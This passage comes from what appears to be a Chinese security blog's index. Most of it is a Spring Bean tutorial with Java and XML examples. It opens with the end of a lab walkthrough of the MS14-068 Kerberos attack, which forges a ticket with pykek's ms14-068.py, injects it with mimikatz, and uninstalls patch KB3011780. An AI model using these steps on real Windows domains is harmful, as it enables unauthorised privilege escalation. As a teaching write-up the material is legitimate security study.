到下面的网址下载库文件到Kali的Python目录中，否则命令执行会报错： https://github.com/bidord/pykek 到下载了库文件的目录下（也可以将下载的库文件添加到Python目录中）执行命令生成票据： 1python ms14-068.py -u win7@wy.com -s S-1-5-21-3820864329-1176416056-238591408-1109 -d 10.10.10.144 将票据`TGT_win7@wy.com.ccache`复制到Win7中。 本地管理员登陆，把票据放到该目录下，进入mimikatz框架执行： 1kerberos::ptc TGT_win7@lab.com.ccache 虽然注入成功了但是却没有得到相应的权限，查找关于ms14-068的补丁，看到编号为3011780：Kb3011780：https://technet.microsoft.com/library/security/ms14-068 然后再win7上用 1appwiz.cpl 打开查看补丁更新，查看到Kb3011780的补丁，将它卸载掉即可：","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"Windows","slug":"Windows","permalink":"https://www.mi1k7ea.com/tags/Windows/"},{"name":"提权","slug":"提权","permalink":"https://www.mi1k7ea.com/tags/提权/"}]},{"title":"Spring基础篇之Bean","date":"2019-01-01T14:00:06.000Z","path":"2019/01/01/Spring基础篇之Bean/","text":"0x00 参考本笔记直接参考或引自如下链接文章： https://www.w3cschool.cn/wkspring/ http://c.biancheng.net/spring/ 0x01 Bean定义被称作Bean的对象是构成应用程序的支柱，也是由Spring IoC容器管理的。Bean是一个被实例化、组装、并通过Spring IoC容器所管理的对象。这些Bean是由用容器提供的配置元数据创建的，例如前面看到的在XML的表单中的定义。 Spring配置文件支持两种不同的格式，分别是XML文件格式和Properties文件格式。 通常情况下，Spring会以XML文件格式作为Spring的配置文件，这种配置方式通过XML文件注册并管理Bean之间的依赖关系。XML格式配置文件的根元素是&lt;beans&gt;，该元素包含了多个&lt;bean&gt;子元素，每一个&lt;bean&gt;子元素定义了一个Bean，并描述了该Bean如何被装配到Spring容器中。 定义Bean的示例： 12345678910111213&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:p=\"http://www.springframework.org/schema/p\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.2.xsd\"&gt; &lt;!-- 使用id属性定义person1，其对应的实现类为com.mengma.person1 --&gt; &lt;bean id=\"person1\" class=\"com.mengma.damain.Person1\" /&gt; &lt;!--使用name属性定义person2，其对应的实现类为com.mengma.domain.Person2--&gt; &lt;bean name=\"Person2\" class=\"com.mengma.domain.Person2\"/&gt; &lt;/beans&gt; &lt;bean&gt;元素的常用属性： 属性名称 描述 id 是一个 Bean 的唯一标识符，Spring 容器对 Bean 的配置和管理都通过该属性完成 name Spring 容器同样可以通过此属性对容器中的 Bean 进行配置和管理，name 属性中可以为 Bean 指定多个名称，每个名称之间用逗号或分号隔开 class 该属性指定了 Bean 的具体实现类，它必须是一个完整的类名，使用类的全限定名 scope 用于设定 Bean 实例的作用域，其属性值有 singleton（单例）、prototype（原型）、request、session 和 global Session。其默认值是 singleton constructor-arg &lt;bean&gt;元素的子元素，可以使用此元素传入构造参数进行实例化。该元素的 index 属性指定构造参数的序号（从 0 开始），type 属性指定构造参数的类型 property &lt;bean&gt;元素的子元素，用于调用 Bean 实例中的 Set 方法完成属性赋值，从而完成依赖注入。该元素的 name 属性指定 Bean 实例中的相应属性名 ref &lt;property&gt;和&lt;constructor-arg&gt;等元素的子元索，该元素中的 bean 属性用于指定对 Bean 工厂中某个 Bean 实例的引用 value &lt;property&gt;和&lt;constractor-arg&gt;等元素的子元素，用于直接指定一个常量值 list 用于封装 List 或数组类型的依赖注入 set 用于封装 Set 类型属性的依赖注入 map 用于封装 Map 类型属性的依赖注入 entry &lt;map&gt;元素的子元素，用于设置一个键值对。其 key 属性指定字符串类型的键值，ref 或 value 子元素指定其值 下图表达了Bean与Spring容器之间的关系： 0x02 Bean实例化在面向对象的程序中，要想调用某个类的成员方法，就需要先实例化该类的对象。在Spring中，实例化Bean有三种方式，分别是构造器实例化、静态工厂方式实例化和实例工厂方式实例化。 构造器实例化构造器实例化是指Spring容器通过Bean对应的类中默认的构造函数实例化Bean。 DemoPerson.java，Bean类，拥有一个构造函数： 1234567package com.mi1k7ea;public class Person &#123; public Person() &#123; System.out.println(\"Person构造函数\"); &#125;&#125; MainApp.java： 123456789101112131415package com.mi1k7ea;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; // 定义Spring配置文件的路径 String xmlPath = \"Beans.xml\"; // 初始化Spring容器，加载配置文件，并对bean进行实例化 ApplicationContext applicationContext = new ClassPathXmlApplicationContext(xmlPath); // 通过容器获取id为person1的实例 System.out.println(applicationContext.getBean(\"person\")); &#125;&#125; Beans.xml，定义了一个id为person的Bean，其class属性指定了对应的类为Person： 123456789&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;bean id=\"person\" class=\"com.mi1k7ea.Person\" /&gt;&lt;/beans&gt; 运行输出，看到是通过调用Bean类的构造函数来实例化Bean： 静态工厂方式实例化在Spring中，可以使用静态工厂的方式实例化Bean。此种方式需要提供一个静态工厂方法创建Bean的实例。 DemoMainApp.java和Person.java不变。 MyBeanFactory.java，创建一个名为createBean()的静态方法，用于创建Bean的实例： 123456789package com.mi1k7ea;public class MyBeanFactory &#123; // 创建Bean实例的静态工厂方法 public static Person createBean() &#123; System.out.println(\"MyBeanFactory.createBean()\"); return new Person(); &#125;&#125; Beans.xml，定义了一个id为person的Bean，其class属性指定了对应的工厂实现类为MyBeanFactory，而factory-method属性用于告诉Spring容器调用工厂类中的createBean()方法获取Bean的实例： 123456789&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;bean id=\"person\" class=\"com.mi1k7ea.MyBeanFactory\" factory-method=\"createBean\" /&gt;&lt;/beans&gt; 运行输出，看到是通过调用静态工厂的方式即调用MyBeanFactory的静态方法createBean()来实例化Bean： 实例工厂方式实例化在这种方式中，工厂类不再使用静态方法创建Bean的实例，而是直接在成员方法中创建Bean的实例。同时，在配置文件中，需要实例化的Bean也不是通过class属性直接指向其实例化的类，而是通过factory-bean属性配置一个实例工厂，然后使用factory-method属性确定使用工厂中的哪个方法。 DemoPerson.java和MainApp.java不变。 MyBeanFactory.java： 12345678910111213package com.mi1k7ea;public class MyBeanFactory &#123; public MyBeanFactory() &#123; System.out.println(\"MyBeanFactory构造函数\"); &#125; // 创建Bean实例的方法 public Person createBean() &#123; System.out.println(\"MyBeanFactory.createBean()\"); return new Person(); &#125;&#125; Beans.xml，首先配置了一个实例工厂Bean，然后配置了需要实例化的Bean，在id为person的Bean中，使用factory-bean属性指定一个实例工厂，该属性值就是实例工厂的id属性值，使用factory-method属性确定使用工厂中的createBean()方法： 12345678910111213&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;!-- 配置实例工厂 --&gt; &lt;bean id=\"myBeanFactory\" class=\"com.mi1k7ea.MyBeanFactory\" /&gt; &lt;!-- factory-bean属性指定一个实例工厂，factory-method属性确定使用工厂中的哪个方法 --&gt; &lt;bean id=\"person\" factory-bean=\"myBeanFactory\" factory-method=\"createBean\" /&gt;&lt;/beans&gt; 运行输出，看到先实例化工厂类并调用createBean()方法成功实例化Bean： 0x03 Bean作用域当在Spring中定义一个Bean时，你必须声明该Bean的作用域的选项。例如，为了强制Spring在每次需要时都产生一个新的Bean实例，你应该声明Bean的作用域的属性为prototype。同理，如果你想让Spring在每次需要时都返回同一个Bean实例，你应该声明Bean的作用域的属性为singleton。 Spring 框架支持以下五个作用域： 作用域 描述 singleton 在Spring IoC容器仅存在一个Bean实例，Bean以单例方式存在，默认值 prototype 每次从容器中调用Bean时，都返回一个新的实例，即每次调用getBean()时，相当于执行newXxxBean() request 每次HTTP请求都会创建一个新的Bean，该作用域仅适用于WebApplicationContext环境 session 同一个HTTP Session共享一个Bean，不同Session使用不同的Bean，仅适用于WebApplicationContext环境 global-session 一般用于Portlet应用环境，该运用域仅适用于WebApplicationContext环境 singletonsingleton是默认的作用域。当一个Bean的作用域为singleton时，Spring容器中只会存在一个共享的Bean实例，并且所有对Bean的请求，只要id与该Bean定义相匹配，就只会返回Bean的同一个实例。 singleton是单例类型，就是在创建起容器时就同时自动创建了一个Bean的对象，不管你是否使用，它都存在了，每次获取到的对象都是同一个对象。 通常情况下，这种单例模式对于无会话状态的Bean（如DAO层、Service层）来说，是最理想的选择。 XML中显式设置示例： 1234&lt;!-- A bean definition with singleton scope --&gt;&lt;bean id=\"...\" class=\"...\" scope=\"singleton\"&gt; &lt;!-- collaborators and configuration for this bean go here --&gt;&lt;/bean&gt; Demo沿用前面的例子，HelloWorld.java不变。 MainApp.java，调用两次getBean()并调用Bean的getMessage()方法查看是否是同一个对象： 123456789101112131415package com.mi1k7ea;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(\"Beans.xml\"); HelloWorld objA = (HelloWorld) context.getBean(\"helloWorld\"); objA.setMessage(\"Object A\"); objA.getMessage(); HelloWorld objB = (HelloWorld) context.getBean(\"helloWorld\"); objB.getMessage(); &#125;&#125; Beans.xml，显式设置scope，并去掉其中的设置Bean类属性值的property标签： 123456789&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;bean id=\"helloWorld\" class=\"com.mi1k7ea.HelloWorld\" scope=\"singleton\" /&gt;&lt;/beans&gt; 输出都是一样的，说明singleton作用域即默认的作用域就是单例模式，在创建容器时就自动创建了该Bean对象，而每次getBean()获取到的都是同一个Bean对象： prototype当一个Bean的作用域为prototype，表示一个Bean定义对应多个对象实例。prototype作用域的Bean会导致在每次对该Bean请求（将其注入到另一个Bean中，或者以程序的方式调用容器的getBean()方法）时都会创建一个新的Bean实例。 prototype是原型类型，它在我们创建容器的时候并没有实例化，而是当我们获取Bean的时候才会去创建一个对象，而且我们每次获取到的对象都不是同一个对象。 根据经验，对有状态的Bean应该使用prototype作用域，而对无状态的Bean则应该使用singleton作用域。 XML中设置示例： 1234&lt;!-- A bean definition with singleton scope --&gt;&lt;bean id=\"...\" class=\"...\" scope=\"prototype\"&gt; &lt;!-- collaborators and configuration for this bean go here --&gt;&lt;/bean&gt; DemoHelloWorld.java和MainApp.java不变。 Beans.xml，设置scope，并在property标签中设置创建Bean类时message属性的默认值为”Default Object”： 1234567891011&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;bean id=\"helloWorld\" class=\"com.mi1k7ea.HelloWorld\" scope=\"prototype\"&gt; &lt;property name=\"message\" value=\"Default Object\"/&gt; &lt;/bean&gt;&lt;/beans&gt; 输出不一样，说明两次getBean()获取的Bean类对象并不是同一个，同时说明prototype作用域是在获取Bean时会新建一个Bean对象： 0x04 Bean生命周期Bean的生命周期可以表达为：Bean的定义-&gt;Bean的初始化-&gt;Bean的使用-&gt;Bean的销毁 Spring容器可以管理singleton作用域Bean的生命周期，在此作用域下，Spring能够精确地知道该Bean何时被创建，何时初始化完成，以及何时被销毁。而对于prototype作用域的Bean，Spring只负责创建，当容器创建了Bean的实例后，Bean的实例就交给客户端代码管理，Spring容器将不再跟踪其生命周期。每次客户端请求prototype作用域的Bean时，Spring容器都会创建一个新的实例，并且不会管那些被配置成prototype作用域的Bean的生命周期。 当一个Bean被加载到Spring容器时，它就具有了生命，而Spring容器在保证一个Bean能够使用之前，会进行很多工作。Spring容器中Bean的生命周期流程如图： Bean生命周期的整个执行过程描述如下： 根据配置情况调用Bean构造方法或工厂方法实例化Bean。 利用依赖注入完成Bean中所有属性值的配置注入。 如果Bean实现了BeanNameAware接口，则Spring调用Bean的setBeanName()方法传入当前Bean的id值。 如果Bean实现了BeanFactoryAware接口，则Spring调用setBeanFactory()方法传入当前工厂实例的引用。 如果Bean实现了ApplicationContextAware接口，则Spring调用setApplicationContext()方法传入当前ApplicationContext实例的引用。 如果BeanPostProcessor和Bean关联，则Spring将调用该接口的预初始化方法postProcessBeforeInitialzation()对Bean进行加工操作，此处非常重要，Spring的AOP就是利用它实现的。 如果Bean实现了InitializingBean接口，则Spring将调用afterPropertiesSet()方法。 如果在配置文件中通过init-method属性指定了初始化方法，则调用该初始化方法。 如果BeanPostProcessor和Bean关联，则Spring将调用该接口的初始化方法postProcessAfterInitialization()。此时，Bean已经可以被应用系统使用了。 如果在&lt;bean&gt;中指定了该 Bean 的作用范围为scope=”singleton”，则将该Bean放入Spring IoC的缓存池中，将触发Spring对该Bean的生命周期管理；如果在&lt;bean&gt;中指定了该Bean的作用范围为scope=”prototype”，则将该Bean交给调用者，调用者管理该Bean的生命周期，Spring不再管理该Bean。 如果Bean实现了DisposableBean接口，则Spring会调用destory()方法将Spring中的Bean销毁；如果在配置文件中通过destory-method属性指定了Bean的销毁方法，则Spring将调用该方法对Bean进行销毁。 这里我们只讨论两个重要的生命周期回调方法，它们在Bean的初始化和销毁的时候是必需的。 为了定义安装和拆卸一个Bean，我们只要声明带有init-method或destroy-method参数的 。init-method属性指定一个方法，在实例化Bean 时，立即调用该方法。同样，destroy-method指定一个方法，只有从容器中移除Bean之后，才能调用该方法。 初始化回调org.springframework.beans.factory.InitializingBean接口指定一个单一的方法： 1void afterPropertiesSet() throws Exception; 因此，你可以简单地实现上述接口和初始化工作可以在afterPropertiesSet()方法中执行，如下所示： 12345public class ExampleBean implements InitializingBean &#123; public void afterPropertiesSet() &#123; // do some initialization work &#125;&#125; 在基于XML的配置元数据的情况下，你可以使用 init-method 属性来指定带有void无参数方法的名称。例如： 1&lt;bean id=\"exampleBean\" class=\"examples.ExampleBean\" init-method=\"init\"/&gt; 下面是类的定义： 12345public class ExampleBean &#123; public void init() &#123; // do some initialization work &#125;&#125; 销毁回调org.springframework.beans.factory.DisposableBean接口指定一个单一的方法： 1void destroy() throws Exception; 因此，你可以简单地实现上述接口并且结束工作可以在destroy()方法中执行，如下所示： 12345public class ExampleBean implements DisposableBean &#123; public void destroy() &#123; // do some destruction work &#125;&#125; 在基于XML的配置元数据的情况下，你可以使用 destroy-method 属性来指定带有void无参数方法的名称。例如： 1&lt;bean id=\"exampleBean\" class=\"examples.ExampleBean\" destroy-method=\"destroy\"/&gt; 下面是类的定义： 12345public class ExampleBean &#123; public void destroy() &#123; // do some destruction work &#125;&#125; 如果你在非Web应用程序环境中使用Spring IoC容器，例如在丰富的客户端桌面环境中，那么在JVM中你要注册关闭hook。这样做可以确保正常关闭，为了让所有的资源都被释放，可以在单个Beans上调用destroy方法。 默认的初始化和销毁方法如果你有太多具有相同名称的初始化或者销毁方法的Bean，那么你不需要在每一个Bean上声明初始化方法和销毁方法。框架使用元素中的 default-init-method 和 default-destroy-method 属性提供了灵活地配置这种情况，如下所示： 123456789101112&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\" default-init-method=\"init\" default-destroy-method=\"destroy\"&gt; &lt;bean id=\"...\" class=\"...\"&gt; &lt;!-- collaborators and configuration for this bean go here --&gt; &lt;/bean&gt;&lt;/beans&gt; Demo修改HelloWorld.java，添加init()和destroy()方法： 123456789101112131415161718192021package com.mi1k7ea;public class HelloWorld &#123; private String message; public void setMessage(String message)&#123; this.message = message; &#125; public void getMessage()&#123; System.out.println(\"Your Message : \" + message); &#125; public void init()&#123; System.out.println(\"Bean is going through init.\"); &#125; public void destroy()&#123; System.out.println(\"Bean will destroy now.\"); &#125;&#125; 修改MainApp.java，需要注册一个在AbstractApplicationContext类中声明的关闭hook的registerShutdownHook()方法。它将确保正常关闭，并且调用相关的destroy()方法： 12345678910111213package com.mi1k7ea;import org.springframework.context.support.AbstractApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; AbstractApplicationContext context = new ClassPathXmlApplicationContext(\"Beans.xml\"); HelloWorld obj = (HelloWorld) context.getBean(\"helloWorld\"); obj.getMessage(); context.registerShutdownHook(); &#125;&#125; Beans.xml，通过init-method和destroy-method来设置初始化和销毁的回调方法： 1234567891011&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;bean id=\"helloWorld\" class=\"com.mi1k7ea.HelloWorld\" init-method=\"init\" destroy-method=\"destroy\"&gt; &lt;property name=\"message\" value=\"mi1k7ea\"/&gt; &lt;/bean&gt;&lt;/beans&gt; 运行输出，看到在在初始化之前调用了初始化回调方法以及在销毁Bean对象之前调用了销毁回调方法： Spring中的事件处理ApplicationContext负责管理Beans的完整生命周期。当加载Beans时，ApplicationContext发布某些类型的事件。例如，当上下文启动时，ContextStartedEvent发布，当上下文停止时，ContextStoppedEvent发布。 通过ApplicationEvent类和ApplicationListener接口来提供在ApplicationContext中处理事件。如果一个Bean实现ApplicationListener，那么每次ApplicationEvent被发布到ApplicationContext上，那个Bean会被通知。 Spring提供了以下的标准事件： Spring 内置事件 描述 ContextRefreshedEvent ApplicationContext被初始化或刷新时，该事件被发布。这也可以在ConfigurableApplicationContext接口中使用refresh()方法来发生。 ContextStartedEvent 当使用ConfigurableApplicationContext接口中的start()方法启动ApplicationContext时，该事件被发布。你可以调查你的数据库，或者你可以在接受到这个事件后重启任何停止的应用程序。 ContextStoppedEvent 当使用ConfigurableApplicationContext接口中的stop()方法停止ApplicationContext时，发布这个事件。你可以在接受到这个事件后做必要的清理的工作。 ContextClosedEvent 当使用ConfigurableApplicationContext接口中的close()方法关闭ApplicationContext时，该事件被发布。一个已关闭的上下文到达生命周期末端；它不能被刷新或重启。 RequestHandledEvent 这是一个web-specific事件，告诉所有Bean HTTP请求已经被服务。 监听上下文事件为了监听上下文事件，一个Bean应该实现只有一个方法onApplicationEvent()的ApplicationListener接口。 下面看下例子。 HelloWorld.java： 12345678910111213package com.mi1k7ea;public class HelloWorld &#123; private String message; public void setMessage(String message)&#123; this.message = message; &#125; public void getMessage()&#123; System.out.println(\"Your Message : \" + message); &#125;&#125; CStartEventHandler.java，实现ApplicationListener类的ContextStartedEvent事件： 12345678910package com.mi1k7ea;import org.springframework.context.ApplicationListener;import org.springframework.context.event.ContextStartedEvent;public class CStartEventHandler implements ApplicationListener&lt;ContextStartedEvent&gt; &#123; public void onApplicationEvent(ContextStartedEvent event) &#123; System.out.println(\"ContextStartedEvent Received\"); &#125;&#125; CStopEventHandler.java，实现ApplicationListener类的ContextStoppedEvent事件： 12345678910package com.mi1k7ea;import org.springframework.context.ApplicationListener;import org.springframework.context.event.ContextStoppedEvent;public class CStopEventHandler implements ApplicationListener&lt;ContextStoppedEvent&gt; &#123; public void onApplicationEvent(ContextStoppedEvent event) &#123; System.out.println(\"ContextStoppedEvent Received\"); &#125;&#125; MainApp.java： 1234567891011121314151617181920package com.mi1k7ea;import org.springframework.context.ConfigurableApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ConfigurableApplicationContext context = new ClassPathXmlApplicationContext(\"Beans.xml\"); // Let us raise a start event. context.start(); HelloWorld obj = (HelloWorld) context.getBean(\"helloWorld\"); obj.getMessage(); // Let us raise a stop event. context.stop(); &#125;&#125; Beans.xml，添加两个实现监听上下文事件的Bean类： 123456789101112131415&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd&quot;&gt; &lt;bean id=&quot;helloWorld&quot; class=&quot;com.mi1k7ea.HelloWorld&quot;&gt; &lt;property name=&quot;message&quot; value=&quot;mi1k7ea&quot;/&gt; &lt;/bean&gt; &lt;bean id=&quot;cStartEventHandler&quot; class=&quot;com.mi1k7ea.CStartEventHandler&quot;/&gt; &lt;bean id=&quot;cStopEventHandler&quot; class=&quot;com.mi1k7ea.CStopEventHandler&quot;/&gt;&lt;/beans&gt; 运行输出： Spring中的自定义事件Spring支持编写和发布用户的自定义事件，具体步骤如下示例。 CustomEvent.java，通过扩展ApplicationEvent类来创建的事件类，这个类必须定义一个默认的构造函数，它应该是从ApplicationEvent类中继承的构造函数： 123456789101112package com.mi1k7ea;import org.springframework.context.ApplicationEvent;public class CustomEvent extends ApplicationEvent &#123; public CustomEvent(Object source) &#123; super(source); &#125; public String toString()&#123; return \"My Custom Event\"; &#125;&#125; 一旦定义事件类，你可以从任何类中发布它。 CustomEventPublisher.java，实现了ApplicationEventPublisherAware接口类，用于发布事件类，此外还需要在XML配置文件中声明这个类作为一个Bean，之所以容器可以识别Bean作为事件发布者，是因为它实现了ApplicationEventPublisherAware接口： 12345678910111213141516package com.mi1k7ea;import org.springframework.context.ApplicationEventPublisher;import org.springframework.context.ApplicationEventPublisherAware;public class CustomEventPublisher implements ApplicationEventPublisherAware &#123; private ApplicationEventPublisher publisher; public void setApplicationEventPublisher (ApplicationEventPublisher publisher)&#123; this.publisher = publisher; &#125; public void publish() &#123; CustomEvent ce = new CustomEvent(this); publisher.publishEvent(ce); &#125;&#125; CustomEventHandler.java，实现了ApplicationListener接口类，发布的事件可以在该类中被处理，而且实现了自定义事件的onApplicationEvent()方法： 123456789package com.mi1k7ea;import org.springframework.context.ApplicationListener;public class CustomEventHandler implements ApplicationListener&lt;CustomEvent&gt; &#123; public void onApplicationEvent(CustomEvent event) &#123; System.out.println(event.toString()); &#125;&#125; MainApp.java，获取自定义事件发布者的Bean，并调用发布方法： 123456789101112package com.mi1k7ea;import org.springframework.context.ConfigurableApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ConfigurableApplicationContext context = new ClassPathXmlApplicationContext(\"Beans.xml\"); CustomEventPublisher cvp = (CustomEventPublisher) context.getBean(\"customEventPublisher\"); cvp.publish(); &#125;&#125; Beans.xml，声明事件发布者的Bean和事务处理者的Bean： 1234567891011&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;bean id=\"customEventHandler\" class=\"com.mi1k7ea.CustomEventHandler\"/&gt; &lt;bean id=\"customEventPublisher\" class=\"com.mi1k7ea.CustomEventPublisher\"/&gt;&lt;/beans&gt; 运行输出： 0x05 Bean后置处理器Bean后置处理器允许在调用初始化方法前后对Bean进行额外的处理。 BeanPostProcessor接口定义回调方法，你可以实现该方法来提供自己的实例化逻辑，依赖解析逻辑等。你也可以在Spring容器通过插入一个或多个BeanPostProcessor的实现来完成实例化，配置和初始化一个Bean之后实现一些自定义逻辑回调方法。 你可以配置多个BeanPostProcessor接口，通过设置BeanPostProcessor实现的Ordered接口提供的order属性来控制这些BeanPostProcessor接口的执行顺序。 BeanPostProcessor可以对Bean（或对象）实例进行操作，这意味着Spring IoC容器实例化一个Bean实例，然后BeanPostProcessor接口进行它们的工作。 ApplicationContext会自动检测由BeanPostProcessor接口的实现定义的Bean，注册这些Bean为后置处理器，然后通过在容器中创建Bean，在适当的时候调用它。 DemoHelloWorld.java，添加初始化和销毁方法： 123456789101112131415161718192021package com.mi1k7ea;public class HelloWorld &#123; private String message; public void setMessage(String message)&#123; this.message = message; &#125; public void getMessage()&#123; System.out.println(\"Your Message : \" + message); &#125; public void init()&#123; System.out.println(\"Bean is going through init.\"); &#125; public void destroy()&#123; System.out.println(\"Bean will destroy now.\"); &#125;&#125; InitHelloWorld.java，实现BeanPostProcessor接口类，在任何Bean的初始化前后输出该Bean的名称： 123456789101112131415package com.mi1k7ea;import org.springframework.beans.BeansException;import org.springframework.beans.factory.config.BeanPostProcessor;public class InitHelloWorld implements BeanPostProcessor &#123; public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException &#123; System.out.println(\"BeforeInitialization : \" + beanName); return bean; // you can return any other object as well &#125; public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException &#123; System.out.println(\"AfterInitialization : \" + beanName); return bean; // you can return any other object as well &#125;&#125; MainApp.java，需要注册一个在AbstractApplicationContext类中声明的关闭hook的registerShutdownHook()方法。它将确保正常关闭，并且调用相关的destroy方法： 12345678910111213package com.mi1k7ea;import org.springframework.context.support.AbstractApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; AbstractApplicationContext context = new ClassPathXmlApplicationContext(\"Beans.xml\"); HelloWorld obj = (HelloWorld) context.getBean(\"helloWorld\"); obj.getMessage(); context.registerShutdownHook(); &#125;&#125; Beans.xml，在前面初始化回调和销毁回调的基础上，添加设置bean标签指定后置处理器为InitHelloWorld，ApplicationContext会自动检测到该实现类定义的Bean为后置处理器、在恰当的时候调用它： 12345678910111213&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;bean id=\"helloWorld\" class=\"com.mi1k7ea.HelloWorld\" init-method=\"init\" destroy-method=\"destroy\"&gt; &lt;property name=\"message\" value=\"mi1k7ea\"/&gt; &lt;/bean&gt; &lt;bean class=\"com.mi1k7ea.InitHelloWorld\" /&gt;&lt;/beans&gt; 运行输出如下，看到在调用HelloWorld的初始化函数init()的前后都调用了Bean后置处理器对应的函数进行输出： 0x06 Bean定义继承Bean定义可以包含很多的配置信息，包括构造函数的参数、属性值、容器的具体信息等等。 子Bean的定义继承父定义的配置数据。子定义可以根据需要重写一些值，或者添加其他值。 Spring Bean定义的继承与Java类的继承无关，但是继承的概念是一样的。你可以定义一个父Bean的定义作为模板，其他子Bean就可以从父Bean中继承所需的配置。 当你使用基于XML的配置元数据时，通过使用父属性，指定父Bean作为该属性的值来表明子Bean的定义。 DemoHelloWorld.java，拥有2个message属性及其getter和setter方法： 12345678910111213141516171819202122package com.mi1k7ea;public class HelloWorld &#123; private String message1; private String message2; public void setMessage1(String message)&#123; this.message1 = message; &#125; public void setMessage2(String message)&#123; this.message2 = message; &#125; public void getMessage1()&#123; System.out.println(\"Message1 : \" + message1); &#125; public void getMessage2()&#123; System.out.println(\"Message2 : \" + message2); &#125;&#125; Son.java，拥有3个message属性及其getter和setter方法： 12345678910111213141516171819202122232425262728293031package com.mi1k7ea;public class Son &#123; private String message1; private String message2; private String message3; public void setMessage1(String message)&#123; this.message1 = message; &#125; public void setMessage2(String message)&#123; this.message2 = message; &#125; public void setMessage3(String message)&#123; this.message3 = message; &#125; public void getMessage1()&#123; System.out.println(\"Son Message1 : \" + message1); &#125; public void getMessage2()&#123; System.out.println(\"Son Message2 : \" + message2); &#125; public void getMessage3()&#123; System.out.println(\"Son Message3 : \" + message3); &#125;&#125; MainApp.java，分别声明了HelloWorld对象和Son对象并分别调用getter方法： 1234567891011121314151617181920package com.mi1k7ea;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(\"Beans.xml\"); HelloWorld objA = (HelloWorld) context.getBean(\"helloWorld\"); objA.getMessage1(); objA.getMessage2(); Son objB = (Son) context.getBean(\"son\"); objB.getMessage1(); objB.getMessage2(); objB.getMessage3(); &#125;&#125; Beans.xml，注意son是作为helloWorld的子Bean，用parent标记其父Bean，其中重写了message1的属性，继承了message2的属性，添加了message3属性： 1234567891011121314151617&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans 